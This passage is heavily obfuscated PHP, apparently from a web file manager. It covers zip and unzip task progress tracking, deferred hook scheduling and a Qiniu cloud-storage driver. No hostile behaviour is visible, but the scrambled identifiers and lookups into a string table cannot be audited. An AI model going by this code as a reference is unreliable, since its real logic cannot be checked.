$„‡ƒï¡È[$Äº‘ÆĞá][$ÃÀ¥…ƒ¿[1894]] < $ßÃ“ ¹ó[$ÃÀ¥…ƒ¿[206]] * 0.3) { return; } $ßÃ“ ¹ó[$ÃÀ¥…ƒ¿[1895]] = $„‡ƒï¡È[$Äº‘ÆĞá][$ÃÀ¥…ƒ¿[1895]]; } $„‡ƒï¡È[$Äº‘ÆĞá] = $ßÃ“ ¹ó; Cache::set($ã£¤ó, $„‡ƒï¡È, 60); Cache::removeMemory($ã£¤ó); write_log($ÃÀ¥…ƒ¿[1896] . $Äº‘ÆĞá . $ÃÀ¥…ƒ¿[74] . $õßŞ‘†, $ÃÀ¥…ƒ¿[197]); } public static function timeLimitCallLoop() { $¤àõŠ¢È =& $_SERVER[¡¬ıÜ ƒ]; $ù³ùæ’É = array($¤àõŠ¢È[1897]); $‚†¯Ö’ = in_array(strtolower(ACTION), $ù³ùæ’É); if (!$‚†¯Ö’ && !self::$asyncAdd) { return; } $İù‰œõÉ = $¤àõŠ¢È[1893]; $ğ†è¡üè = Cache::get($İù‰œõÉ, !0); if (!$ğ†è¡üè || count($ğ†è¡üè) <= 0) { return; } $Ø³üÕÕ¡ = !1; $Ï˜Éñ» = timeFloat(); $’£é¤£“ = array(); foreach ($ğ†è¡üè as $ßğ‚‡Ë => $Óˆšˆµù) { if ($Ï˜Éñ» - $Óˆšˆµù[$¤àõŠ¢È[1895]] > $Óˆšˆµù[$¤àõŠ¢È[206]]) { $Ø³üÕÕ¡ = !0; try { Hook::apply($Óˆšˆµù[$¤àõŠ¢È[343]], $Óˆšˆµù[$¤àõŠ¢È[1885]]); write_log($¤àõŠ¢È[1898] . $ßğ‚‡Ë . $¤àõŠ¢È[74] . $Óˆšˆµù[$¤àõŠ¢È[343]] . $¤àõŠ¢È[1899] . ACTION, $¤àõŠ¢È[197]); } catch (Exception $âß¯Ã«) { } continue; } $’£é¤£“[$ßğ‚‡Ë] = $Óˆšˆµù; } if (!$Ø³üÕÕ¡) { return; } if (!$’£é¤£“) { return Cache::remove($İù‰œõÉ); } Cache::set($İù‰œõÉ, $’£é¤£“, 60); Cache::removeMemory($İù‰œõÉ); } public static function finished($£²À‚ğÈ, $ôŒö×ÚÖ) { $¸ğÆã¡¤ =& $_SERVER[¡¬ıÜ ƒ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¸ğÆã¡¤[343] => $£²À‚ğÈ, $¸ğÆã¡¤[1885] => $ôŒö×ÚÖ); } private static function finishedRun() { $Øå™ëáÄ =& $_SERVER[¡¬ıÜ ƒ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $›â¼¶Ú) { try { Hook::apply($›â¼¶Ú[$Øå™ëáÄ[343]], $›â¼¶Ú[$Øå™ëáÄ[1885]]); } catch (Exception $ÁÃ¥ô•) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ïÙ Ø³Ã =& $_SERVER[¡¬ıÜ ƒ]; parent::startAfter(); Hook::bind($ïÙ Ø³Ã[1900], array($this, $ïÙ Ø³Ã[1901])); Hook::bind($ïÙ Ø³Ã[1289], array($this, $ïÙ Ø³Ã[1902])); Hook::bind($ïÙ Ø³Ã[1903], array($this, $ïÙ Ø³Ã[1904])); $§ŠÊËµí =& $this->task; $§ŠÊËµí[$ïÙ Ø³Ã[1905]] = $ïÙ Ø³Ã[1290]; if (!$§ŠÊËµí[$ïÙ Ø³Ã[1671]]) { $§ŠÊËµí[$ïÙ Ø³Ã[1671]] = LNG($ïÙ Ø³Ã[1906]); } } protected function endAfter() { $¨âµ˜³˜ =& $_SERVER[¡¬ıÜ ƒ]; parent::endAfter(); Hook::unbind($¨âµ˜³˜[1900], array($this, $¨âµ˜³˜[1901])); Hook::unbind($¨âµ˜³˜[1289], array($this, $¨âµ˜³˜[1902])); Hook::unbind($¨âµ˜³˜[1903], array($this, $¨âµ˜³˜[1904])); } public function updateAfter() { $¿ÂÚ¤ıÃ =& $_SERVER[¡¬ıÜ ƒ]; $ïíÊ—›€ =& $this->task; if (!$ïíÊ—›€[$¿ÂÚ¤ıÃ[1151]] || !$ïíÊ—›€[$¿ÂÚ¤ıÃ[843]]) { if ($ïíÊ—›€[$¿ÂÚ¤ıÃ[1905]] != $¿ÂÚ¤ıÃ[390]) { return; } } if ($ïíÊ—›€[$¿ÂÚ¤ıÃ[1905]] == $¿ÂÚ¤ıÃ[1290]) { $Ú‰Í¬³ = 0; if ($ïíÊ—›€[$¿ÂÚ¤ıÃ[1839]]) { $Ú‰Í¬³ = $ïíÊ—›€[$¿ÂÚ¤ıÃ[1840]] / $ïíÊ—›€[$¿ÂÚ¤ıÃ[1839]]; } $ïíÊ—›€[$¿ÂÚ¤ıÃ[1787]] = $Ú‰Í¬³ * 0.3; } else { if ($ïíÊ—›€[$¿ÂÚ¤ıÃ[1905]] == $¿ÂÚ¤ıÃ[390]) { $Ú‰Í¬³ = $ïíÊ—›€[$¿ÂÚ¤ıÃ[1786]] / $ïíÊ—›€[$¿ÂÚ¤ıÃ[1151]]; $ïíÊ—›€[$¿ÂÚ¤ıÃ[1787]] = 0.3 + $Ú‰Í¬³ * 0.4; } else { if ($ïíÊ—›€[$¿ÂÚ¤ıÃ[1905]] == $¿ÂÚ¤ıÃ[110]) { $ÌÏĞœĞ­ = 0; if ($ïíÊ—›€[$¿ÂÚ¤ıÃ[1841]] == $¿ÂÚ¤ıÃ[110]) { $ÌÏĞœĞ­ = $ïíÊ—›€[$¿ÂÚ¤ıÃ[1840]]; } $Ú‰Í¬³ = ($ïíÊ—›€[$¿ÂÚ¤ıÃ[1844]] + $ÌÏĞœĞ­) / $ïíÊ—›€[$¿ÂÚ¤ıÃ[843]]; $ïíÊ—›€[$¿ÂÚ¤ıÃ[1787]] = 0.3 + 0.4 + $Ú‰Í¬³ * 0.3; } } } if ($ïíÊ—›€[$¿ÂÚ¤ıÃ[1787]] > 0) { $ïë«û‹Í = timeFloat() - $ïíÊ—›€[$¿ÂÚ¤ıÃ[1789]] - $ïíÊ—›€[$¿ÂÚ¤ıÃ[1792]]; $ïíÊ—›€[$¿ÂÚ¤ıÃ[1793]] = $ïë«û‹Í * (1 - $ïíÊ—›€[$¿ÂÚ¤ıÃ[1787]]) / $ïíÊ—›€[$¿ÂÚ¤ıÃ[1787]]; } } public function addFile($™­°¦×Ç) { $³±™ß¸ =& $_SERVER[¡¬ıÜ ƒ]; $ÊëÆï Ã =& $this->task; $´òºñ³ = IO::info($™­°¦×Ç); $ÊëÆï Ã[$³±™ß¸[1837]] = $´òºñ³[$³±™ß¸[32]]; $ÊëÆï Ã[$³±™ß¸[1839]] = $´òºñ³[$³±™ß¸[79]]; $ÊëÆï Ã[$³±™ß¸[1840]] = 0; $ÊëÆï Ã[$³±™ß¸[1153]] = $³±™ß¸[1860]; $ÊëÆï Ã[$³±™ß¸[1841]] = $³±™ß¸[1290]; $ÊëÆï Ã[$³±™ß¸[843]] = $´òºñ³[$³±™ß¸[79]]; $ÊëÆï Ã[$³±™ß¸[1151]] = 1; $ÃÒë”ˆó = 0; $ÊëÆï Ã[$³±™ß¸[1848]] = array($³±™ß¸[1849] => $ÃÒë”ˆó + 1, $³±™ß¸[496] => $´òºñ³[$³±™ß¸[32]], $³±™ß¸[87] => $´òºñ³[$³±™ß¸[87]], $³±™ß¸[584] => $´òºñ³[$³±™ß¸[584]] ? $´òºñ³[$³±™ß¸[584]] : $´òºñ³[$³±™ß¸[87]]); $this->update(); } public function zipEvent($’ºâ¯ , $á÷Â—‰õ, $Çı§Ê„Ú, $‚Ë¦µ†) { $šª´²úî =& $_SERVER[¡¬ıÜ ƒ]; $°…µ Œµ =& $this->task; $°…µ Œµ[$šª´²úî[1837]] = get_path_this($á÷Â—‰õ); $°…µ Œµ[$šª´²úî[1839]] = $‚Ë¦µ†; $°…µ Œµ[$šª´²úî[1840]] = $Çı§Ê„Ú; $°…µ Œµ[$šª´²úî[1153]] = $’ºâ¯  == $šª´²úî[1907] ? $šª´²úî[1908] : $šª´²úî[1909]; $°…µ Œµ[$šª´²úî[1841]] = $šª´²úî[12]; $°…µ Œµ[$šª´²úî[843]] = $‚Ë¦µ†; $°…µ Œµ[$šª´²úî[1905]] = $šª´²úî[390]; $this->update(); } public function unzipAfter($³ÕÁ’§¨) { $Ê™÷ª¶Å =& $_SERVER[¡¬ıÜ ƒ]; $ä·‚…ò =& $this->task; $ä·‚…ò[$Ê™÷ª¶Å[1905]] = $Ê™÷ª¶Å[110]; $ôÈ‰Ì±á = IO::infoWithChildren($³ÕÁ’§¨); $øèÌø™¨ = 0; $ä·‚…ò[$Ê™÷ª¶Å[1848]] = array($Ê™÷ª¶Å[1849] => $øèÌø™¨ + 1, $Ê™÷ª¶Å[496] => $ôÈ‰Ì±á[$Ê™÷ª¶Å[32]], $Ê™÷ª¶Å[87] => $ôÈ‰Ì±á[$Ê™÷ª¶Å[87]], $Ê™÷ª¶Å[584] => $ôÈ‰Ì±á[$Ê™÷ª¶Å[584]] ? $ôÈ‰Ì±á[$Ê™÷ª¶Å[584]] : $ôÈ‰Ì±á[$Ê™÷ª¶Å[87]]); if ($ôÈ‰Ì±á[$Ê™÷ª¶Å[33]] == $Ê™÷ª¶Å[232]) { $ä·‚…ò[$Ê™÷ª¶Å[1151]] = 1; } else { $ä·‚…ò[$Ê™÷ª¶Å[1151]] = $ôÈ‰Ì±á[$Ê™÷ª¶Å[82]][$Ê™÷ª¶Å[80]]; } $ä·‚…ò[$Ê™÷ª¶Å[1153]] = $Ê™÷ª¶Å[12]; $ä·‚…ò[$Ê™÷ª¶Å[1841]] = 0; $ä·‚…ò[$Ê™÷ª¶Å[1786]] = 0; $ä·‚…ò[$Ê™÷ª¶Å[1839]] = 0; $ä·‚…ò[$Ê™÷ª¶Å[1840]] = 0; $ä·‚…ò[$Ê™÷ª¶Å[1837]] = $Ê™÷ª¶Å[12]; $ä·‚…ò[$Ê™÷ª¶Å[1844]] = 0; $ä·‚…ò[$Ê™÷ª¶Å[843]] = $ôÈ‰Ì±á[$Ê™÷ª¶Å[79]]; $this->update(); self::log($Ê™÷ª¶Å[1910] . json_encode(array($ä·‚…ò, $ôÈ‰Ì±á))); } public function nameParse($©Ü×Í) { $×†ìÉ‹ =& $_SERVER[¡¬ıÜ ƒ]; $£ÜøåŒ =& $this->task; if ($£ÜøåŒ[$×†ìÉ‹[1905]] == $×†ìÉ‹[1290]) { $£ÜøåŒ[$×†ìÉ‹[1905]] = $×†ìÉ‹[390]; $£ÜøåŒ[$×†ìÉ‹[1844]] = 0; $£ÜøåŒ[$×†ìÉ‹[843]] = 0; } $—É û¨‡ = get_path_this($©Ü×Í); if (strstr($—É û¨‡, $×†ìÉ‹[10])) { $£ÜøåŒ[$×†ìÉ‹[1786]] += 1; $£ÜøåŒ[$×†ìÉ‹[1151]] += 1; } $£ÜøåŒ[$×†ìÉ‹[1837]] = $©Ü×Í; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $˜İĞ€üÔ =& $_SERVER[¡¬ıÜ ƒ]; parent::startAfter(); Hook::bind($˜İĞ€üÔ[1911], array($this, $˜İĞ€üÔ[1901])); Hook::bind($˜İĞ€üÔ[1903], array($this, $˜İĞ€üÔ[1904])); $Øß÷’ãÜ =& $this->task; $Øß÷’ãÜ[$˜İĞ€üÔ[1905]] = $˜İĞ€üÔ[1290]; if (!$Øß÷’ãÜ[$˜İĞ€üÔ[1671]]) { $Øß÷’ãÜ[$˜İĞ€üÔ[1671]] = LNG($˜İĞ€üÔ[1912]); } } protected function endAfter() { $“¾òğÇ® =& $_SERVER[¡¬ıÜ ƒ]; parent::endAfter(); Hook::unbind($“¾òğÇ®[1911], array($this, $“¾òğÇ®[1901])); Hook::unbind($“¾òğÇ®[1903], array($this, $“¾òğÇ®[1904])); } public function updateAfter() { $ÜÔœåÑ =& $_SERVER[¡¬ıÜ ƒ]; $º«ş÷˜’ =& $this->task; if (!$º«ş÷˜’[$ÜÔœåÑ[1151]] || !$º«ş÷˜’[$ÜÔœåÑ[843]]) { return; } if ($º«ş÷˜’[$ÜÔœåÑ[1905]] == $ÜÔœåÑ[1290]) { $¹ÂŸ§ß = $º«ş÷˜’[$ÜÔœåÑ[1840]]; if ($º«ş÷˜’[$ÜÔœåÑ[1841]] != $ÜÔœåÑ[1290]) { $¹ÂŸ§ß = 0; } $«ÌşËÚ÷ = ($º«ş÷˜’[$ÜÔœåÑ[1844]] + $¹ÂŸ§ß) / $º«ş÷˜’[$ÜÔœåÑ[843]]; $º«ş÷˜’[$ÜÔœåÑ[1787]] = $«ÌşËÚ÷ * 0.3; } else { if ($º«ş÷˜’[$ÜÔœåÑ[1905]] == $ÜÔœåÑ[390]) { $«ÌşËÚ÷ = $º«ş÷˜’[$ÜÔœåÑ[1786]] / $º«ş÷˜’[$ÜÔœåÑ[1151]]; $º«ş÷˜’[$ÜÔœåÑ[1787]] = 0.3 + $«ÌşËÚ÷ * 0.5; } else { if ($º«ş÷˜’[$ÜÔœåÑ[1905]] == $ÜÔœåÑ[110]) { $«ÌşËÚ÷ = 0; if ($º«ş÷˜’[$ÜÔœåÑ[1839]]) { $«ÌşËÚ÷ = $º«ş÷˜’[$ÜÔœåÑ[1840]] / $º«ş÷˜’[$ÜÔœåÑ[1839]]; } $º«ş÷˜’[$ÜÔœåÑ[1787]] = 0.3 + 0.5 + $«ÌşËÚ÷ * 0.2; } } } if ($º«ş÷˜’[$ÜÔœåÑ[1787]] > 0) { $Ö‘ûµö” = timeFloat() - $º«ş÷˜’[$ÜÔœåÑ[1789]] - $º«ş÷˜’[$ÜÔœåÑ[1792]]; $º«ş÷˜’[$ÜÔœåÑ[1793]] = $Ö‘ûµö” * (1 - $º«ş÷˜’[$ÜÔœåÑ[1787]]) / $º«ş÷˜’[$ÜÔœåÑ[1787]]; } } public function copyFileStart($Âˆ»ÍÏ©, $¶ù¸É”‹, $ß«¶—÷, $•»û® , $ä°áâıÄ, $à÷Å–¸™) { $„Á¡øôã =& $_SERVER[¡¬ıÜ ƒ]; parent::copyFileStart($Âˆ»ÍÏ©, $¶ù¸É”‹, $ß«¶—÷, $•»û® , $ä°áâıÄ, $à÷Å–¸™); $ìåüõ =& $this->task; if ($ìåüõ[$„Á¡øôã[1905]] == $„Á¡øôã[390]) { $ìåüõ[$„Á¡øôã[1905]] = $„Á¡øôã[110]; } $this->update(); } public function copyFileEnd($Ï‰Î¾, $¿°È‰óŠ, $Š›õè±, $ìÉ¯ïè, $Û©Ë‹””, $˜ÊÉÕÌæ) { $œşÆ’”˜ =& $_SERVER[¡¬ıÜ ƒ]; $ÚÎ–ãû =& $this->task; $ÚÎ–ãû[$œşÆ’”˜[1840]] = $ÚÎ–ãû[$œşÆ’”˜[1839]]; $ÚÎ–ãû[$œşÆ’”˜[1844]] += $ÚÎ–ãû[$œşÆ’”˜[1839]]; $ÚÎ–ãû[$œşÆ’”˜[1841]] = $œşÆ’”˜[12]; $this->update(); } public function zipEvent($¢…®öª, $ÉÑ£Ù’±, $Ì¸ğœÖØ, $ÖÛ’¨ò…) { $à§¥ìè =& $_SERVER[¡¬ıÜ ƒ]; $å…ô–û =& $this->task; $å…ô–û[$à§¥ìè[1837]] = get_path_this($ÉÑ£Ù’±); $å…ô–û[$à§¥ìè[1839]] = $ÖÛ’¨ò…; $å…ô–û[$à§¥ìè[1840]] = $Ì¸ğœÖØ; $å…ô–û[$à§¥ìè[1153]] = $¢…®öª == $à§¥ìè[1913] ? $à§¥ìè[1908] : $à§¥ìè[1909]; $å…ô–û[$à§¥ìè[1841]] = $à§¥ìè[12]; $å…ô–û[$à§¥ìè[843]] = $ÖÛ’¨ò…; $å…ô–û[$à§¥ìè[1905]] = $à§¥ìè[390]; $this->update(); } public function nameParse($×ş÷êÄ×) { $±·¯’Êï =& $_SERVER[¡¬ıÜ ƒ]; $Ş¾ù„‚ =& $this->task; if ($Ş¾ù„‚[$±·¯’Êï[1786]] < $Ş¾ù„‚[$±·¯’Êï[1151]]) { $ôÂ»¾‘ş = get_path_this($×ş÷êÄ×); if (strstr($ôÂ»¾‘ş, $±·¯’Êï[10])) { $Ş¾ù„‚[$±·¯’Êï[1786]] += 1; } } if ($Ş¾ù„‚[$±·¯’Êï[1905]] == $±·¯’Êï[1290]) { $Ş¾ù„‚[$±·¯’Êï[1905]] = $±·¯’Êï[390]; } $Ş¾ù„‚[$±·¯’Êï[1837]] = $×ş÷êÄ×; $this->update(); } } goto aÆšÜ„’¸ˆ; E¼ºÉ½ñÄ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($í”·Óğå) { parent::__construct(); require_once SDK_DIR . $_SERVER[¡¬ıÜ ƒ][1540]; $this->_init($í”·Óğå); } public function _init($¾ÍŠ©–¿) { $½’‹ÉÄ =& $_SERVER[¡¬ıÜ ƒ]; $this->config = $¾ÍŠ©–¿; foreach ($¾ÍŠ©–¿ as $£©ºÄÙ² => $‘¬Ì¶±Á) { if (isset($this->{$£©ºÄÙ²})) { $this->{$£©ºÄÙ²} = $‘¬Ì¶±Á; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($½’‹ÉÄ[1541] . LNG($½’‹ÉÄ[1476])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Àş¼®¢, $±¬»°ù = '', $£Úëæø» = REPEAT_RENAME) { if ($this->setContent($Àş¼®¢, $±¬»°ù)) { return $this->getPathOuter($Àş¼®¢); } return !1; } public function mkdir($²Æ³ëñ‡, $Œ±©«® = REPEAT_SKIP) { $ü¦ñ‚´¸ =& $_SERVER[¡¬ıÜ ƒ]; $ÒÍĞĞÌú = trim($²Æ³ëñ‡, $ü¦ñ‚´¸[8]); if ($this->_isFolder($ÒÍĞĞÌú)) { return $this->getPathOuter($ÒÍĞĞÌú); } $²Æ³ëñ‡ = $ÒÍĞĞÌú . $ü¦ñ‚´¸[8]; $–¼æö¨ğ = get_path_this($ÒÍĞĞÌú); $ğİ²¶ = $²Æ³ëñ‡ . $–¼æö¨ğ; if (!$this->mkfile($ğİ²¶)) { return !1; } if (!$this->moveFile($ğİ²¶, $²Æ³ëñ‡)) { $this->delFile($ğİ²¶); return !1; } return $this->getPathOuter($ÒÍĞĞÌú); } public function copyFile($“ë“ó‰–, $¹æ¢®ß) { $Ç‡”êğ˜ = $this->bucketManager->copy($this->bucket, $“ë“ó‰–, $this->bucket, $¹æ¢®ß, !0); return $Ç‡”êğ˜ ? !1 : $this->getPathOuter($¹æ¢®ß); } public function moveFile($Âºô¤¹¿, $¨×§ñÃ°) { $¾ªÒúè = $this->bucketManager->move($this->bucket, $Âºô¤¹¿, $this->bucket, $¨×§ñÃ°, !0); return $¾ªÒúè ? !1 : $this->getPathOuter($¨×§ñÃ°); } public function delFile($¤Ñ¿—…‹) { if (!$this->exist($¤Ñ¿—…‹)) { return !0; } $®¯…´ÚÆ = $this->bucketManager->delete($this->bucket, $¤Ñ¿—…‹); if (!$®¯…´ÚÆ) { return !0; } return $®¯…´ÚÆ->code() == 612 ? !0 : !1; } public function delFolder($ƒµ«˜×) { $ùáÌòğÌ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->exist($ƒµ«˜×)) { return !0; } $this->listItemCache = !1; $ì¹‘‹Ñû = $this->fileList($ƒµ«˜×); $this->listItemCache = !0; $²Ò­âó© = trim($ƒµ«˜×, $ùáÌòğÌ[8]) . $ùáÌòğÌ[8]; if (!empty($ƒµ«˜×) && $ƒµ«˜× !== $ùáÌòğÌ[230] && !in_array($²Ò­âó©, $ì¹‘‹Ñû[$ùáÌòğÌ[85]])) { $ì¹‘‹Ñû[$ùáÌòğÌ[85]][] = $²Ò­âó©; } $Ğ§Î‡À = $this->delByBatch($ì¹‘‹Ñû[$ùáÌòğÌ[86]]); if (!$Ğ§Î‡À) { return !1; } $Ğ§Î‡À = $this->delByBatch($ì¹‘‹Ñû[$ùáÌòğÌ[85]]); if (!$Ğ§Î‡À) { return !1; } return $this->delFile($²Ò­âó©); } private function delByBatch($ÁŸãÕ¦ß) { foreach (array_chunk($ÁŸãÕ¦ß, 1000) as $éËäŸÌ) { $¸»­ˆû¶ = $this->bucketManager->buildBatchDelete($this->bucket, $éËäŸÌ); list($ÉÕÕÒš½, $†¤„Ï²) = $this->bucketManager->batch($¸»­ˆû¶); if ($†¤„Ï²) { return !1; } } return !0; } public function rename($Ãôà¡û, $Î¹÷¯ñ¦) { return $this->renameObject($Ãôà¡û, $Î¹÷¯ñ¦); } public function fileInfo($ğÓÑ…–„, $úªƒó = false, $ë¸ôô‹ß = array()) { $í×ğ Æê =& $_SERVER[¡¬ıÜ ƒ]; $‡®Êãà = array($í×ğ Æê[32] => $this->pathThis($ğÓÑ…–„), $í×ğ Æê[87] => $this->getPathOuter($í×ğ Æê[8] . $ğÓÑ…–„), $í×ğ Æê[33] => $í×ğ Æê[232], $í×ğ Æê[79] => isset($ë¸ôô‹ß[$í×ğ Æê[1542]]) ? $ë¸ôô‹ß[$í×ğ Æê[1542]] : 0, $í×ğ Æê[169] => $this->ext($ğÓÑ…–„)); if ($úªƒó) { return $‡®Êãà; } $‡®Êãà[$í×ğ Æê[233]] = $‡®Êãà[$í×ğ Æê[88]] = 0; $‡®Êãà[$í×ğ Æê[234]] = $‡®Êãà[$í×ğ Æê[235]] = !0; if (empty($ë¸ôô‹ß)) { $ë¸ôô‹ß = $this->objectMeta($ğÓÑ…–„); if (!$ë¸ôô‹ß) { return $‡®Êãà; } } if (isset($ë¸ôô‹ß[$í×ğ Æê[236]]) && $ë¸ôô‹ß[$í×ğ Æê[236]]) { $‡®Êãà[$í×ğ Æê[237]] = $ë¸ôô‹ß[$í×ğ Æê[236]]; } if (isset($ë¸ôô‹ß[$í×ğ Æê[247]]) && $ë¸ôô‹ß[$í×ğ Æê[247]]) { $‡®Êãà[$í×ğ Æê[237]] = $ë¸ôô‹ß[$í×ğ Æê[247]]; } if (isset($ë¸ôô‹ß[$í×ğ Æê[1543]])) { $‡®Êãà[$í×ğ Æê[88]] = substr($ë¸ôô‹ß[$í×ğ Æê[1543]] . $í×ğ Æê[12], 0, 10); } if (isset($ë¸ôô‹ß[$í×ğ Æê[1542]])) { $‡®Êãà[$í×ğ Æê[79]] = $ë¸ôô‹ß[$í×ğ Æê[1542]]; } return $‡®Êãà; } public function folderInfo($˜¡¡ˆÜ˜, $è¸Ğòğã = false) { $„Áƒ†å¶ =& $_SERVER[¡¬ıÜ ƒ]; $ Ó„šıÑ = array($„Áƒ†å¶[32] => $this->pathThis($˜¡¡ˆÜ˜), $„Áƒ†å¶[87] => $this->getPathOuter($„Áƒ†å¶[8] . $˜¡¡ˆÜ˜), $„Áƒ†å¶[33] => $„Áƒ†å¶[78]); if ($è¸Ğòğã) { return $ Ó„šıÑ; } $ Ó„šıÑ[$„Áƒ†å¶[233]] = $ Ó„šıÑ[$„Áƒ†å¶[88]] = 0; $ Ó„šıÑ[$„Áƒ†å¶[234]] = $ Ó„šıÑ[$„Áƒ†å¶[235]] = !0; $˜¡¡ˆÜ˜ = rtrim($˜¡¡ˆÜ˜, $„Áƒ†å¶[8]) . $„Áƒ†å¶[8]; $á¼°—âÑ = $this->objectMeta($˜¡¡ˆÜ˜); if (isset($á¼°—âÑ[$„Áƒ†å¶[1543]])) { $ Ó„šıÑ[$„Áƒ†å¶[88]] = substr($á¼°—âÑ[$„Áƒ†å¶[1543]] . $„Áƒ†å¶[12], 0, 10); } return $ Ó„šıÑ; } public function listPath($ÈÕ£Ùê, $Ø’­ÍÀ÷ = false) { $ßõ·¤ =& $_SERVER[¡¬ıÜ ƒ]; $ËÉ•šèê = $this->fileList($ÈÕ£Ùê, $ßõ·¤[8], !0); foreach ($ËÉ•šèê[$ßõ·¤[85]] as $šĞ†ñ°ë => $€ùºú¸¨) { $ËÉ•šèê[$ßõ·¤[85]][$šĞ†ñ°ë] = $this->folderInfo($€ùºú¸¨, $Ø’­ÍÀ÷); } foreach ($ËÉ•šèê[$ßõ·¤[86]] as $šĞ†ñ°ë => $€ùºú¸¨) { $ËÉ•šèê[$ßõ·¤[86]][$šĞ†ñ°ë] = $this->fileInfo($€ùºú¸¨[$ßõ·¤[97]], $Ø’­ÍÀ÷, $€ùºú¸¨); } return $ËÉ•šèê; } public function has($™‡·«ëø, $´¢ß·¯‚ = false, $„ÍÆåµú = true) { $á»Ì © =& $_SERVER[¡¬ıÜ ƒ]; $™‡·«ëø = trim($™‡·«ëø, $á»Ì ©[8]); $†ò³†‚ = empty($™‡·«ëø) && $™‡·«ëø !== $á»Ì ©[230] ? $á»Ì ©[12] : $™‡·«ëø . $á»Ì ©[8]; $‰®î¯»× = $á»Ì ©[12]; $Ô³³û·“ = 500; $Í—øò½Ä = $á»Ì ©[8]; $ùô˜»Ä• = $±ıÆ˜ú½ = 0; while (!0) { check_abort(); list($ë¹Şéı, $®ô¯Ã) = $this->bucketManager->listFiles($this->bucket, $†ò³†‚, $‰®î¯»×, $Ô³³û·“, $Í—øò½Ä); if ($®ô¯Ã) { break; } $‰®î¯»× = array_key_exists($á»Ì ©[1488], $ë¹Şéı) ? $‰®î¯»× = $ë¹Şéı[$á»Ì ©[1544]] : $á»Ì ©[12]; if ($´¢ß·¯‚) { if (!empty($ë¹Şéı[$á»Ì ©[1545]])) { $ùô˜»Ä• += count($ë¹Şéı[$á»Ì ©[1545]]); } if (!empty($ë¹Şéı[$á»Ì ©[1546]])) { $±ıÆ˜ú½ += count($ë¹Şéı[$á»Ì ©[1546]]); } if ($‰®î¯»× === $á»Ì ©[12]) { break; } continue; } if ($„ÍÆåµú) { if (!empty($ë¹Şéı[$á»Ì ©[1545]])) { return !0; } } else { if (!empty($ë¹Şéı[$á»Ì ©[1546]])) { return !0; } } if ($‰®î¯»× === $á»Ì ©[12]) { break; } } if ($´¢ß·¯‚) { return array($á»Ì ©[241] => $ùô˜»Ä•, $á»Ì ©[242] => $±ıÆ˜ú½); } return !1; } public function listAll($—ãäÂÑ”) { $ëÁèºé =& $_SERVER[¡¬ıÜ ƒ]; $É¡îßıæ = $this->fileList($—ãäÂÑ”, $ëÁèºé[12], !0); $‰™ı±³³ = array_to_keyvalue($É¡îßıæ[$ëÁèºé[86]], $ëÁèºé[32]); foreach ($É¡îßıæ[$ëÁèºé[85]] as $âêöæ¤œ) { if (is_string($âêöæ¤œ)) { $‰™ı±³³[$âêöæ¤œ] = array($ëÁèºé[79] => 0); } } return $this->listAllFiles($—ãäÂÑ”, $‰™ı±³³); } private function fileList($…¡°î†Ú, $Òœì™ßª = '', $£ÏÓ«™ = 0) { $œ‚¼ş =& $_SERVER[¡¬ıÜ ƒ]; $…¡°î†Ú = trim($…¡°î†Ú, $œ‚¼ş[8]); $Êæİ™é = empty($…¡°î†Ú) && $…¡°î†Ú !== $œ‚¼ş[230] ? $œ‚¼ş[12] : $…¡°î†Ú . $œ‚¼ş[8]; $äî—‘Ô­ = $œ‚¼ş[12]; $åÌ³§èË = 1000; $ÈúË¬ˆ´ = $©ÓÚ¢Ûà = array(); while (!0) { check_abort(); list($‘‹‡ËÇ¨, $åÖÅ…ß¾) = $this->bucketManager->listFiles($this->bucket, $Êæİ™é, $äî—‘Ô­, $åÌ³§èË, $Òœì™ßª); if ($åÖÅ…ß¾) { break; } $äî—‘Ô­ = array_key_exists($œ‚¼ş[1488], $‘‹‡ËÇ¨) ? $äî—‘Ô­ = $‘‹‡ËÇ¨[$œ‚¼ş[1544]] : $œ‚¼ş[12]; $ öÜĞş = isset($‘‹‡ËÇ¨[$œ‚¼ş[1545]]) ? $‘‹‡ËÇ¨[$œ‚¼ş[1545]] : array(); $Ä‰¾¼ = isset($‘‹‡ËÇ¨[$œ‚¼ş[1546]]) ? $‘‹‡ËÇ¨[$œ‚¼ş[1546]] : array(); foreach ($ öÜĞş as $Ë¨ï¬Ï) { if ($Ë¨ï¬Ï[$œ‚¼ş[97]] == $Êæİ™é) { continue; } $ƒÊÀªÆê = $Ë¨ï¬Ï[$œ‚¼ş[97]]; $Á˜™„Äö = $Ë¨ï¬Ï[$œ‚¼ş[1542]]; $Ë¨ï¬Ï[$œ‚¼ş[79]] = $Á˜™„Äö; $í”Ú à‡ = $Á˜™„Äö == 0 && substr($ƒÊÀªÆê, strlen($ƒÊÀªÆê) - 1, 1) == $œ‚¼ş[8] ? !0 : !1; $this->cacheMethodInfoSet($ƒÊÀªÆê, $í”Ú à‡, $Ë¨ï¬Ï); if ($í”Ú à‡) { $ÈúË¬ˆ´[] = $ƒÊÀªÆê; continue; } $©ÓÚ¢Ûà[] = $£ÏÓ«™ ? $Ë¨ï¬Ï : $ƒÊÀªÆê; } foreach ($Ä‰¾¼ as $ƒÊÀªÆê) { if ($ƒÊÀªÆê == $Êæİ™é) { continue; } $ÈúË¬ˆ´[] = $ƒÊÀªÆê; $this->cacheMethodInfoSet($ƒÊÀªÆê, !0); } if ($äî—‘Ô­ === $œ‚¼ş[12]) { break; } } $this->cacheMethodInfoSet($…¡°î†Ú, !0); return array($œ‚¼ş[85] => $ÈúË¬ˆ´, $œ‚¼ş[86] => $©ÓÚ¢Ûà); } public function canRead($ªúŒÑä›) { return 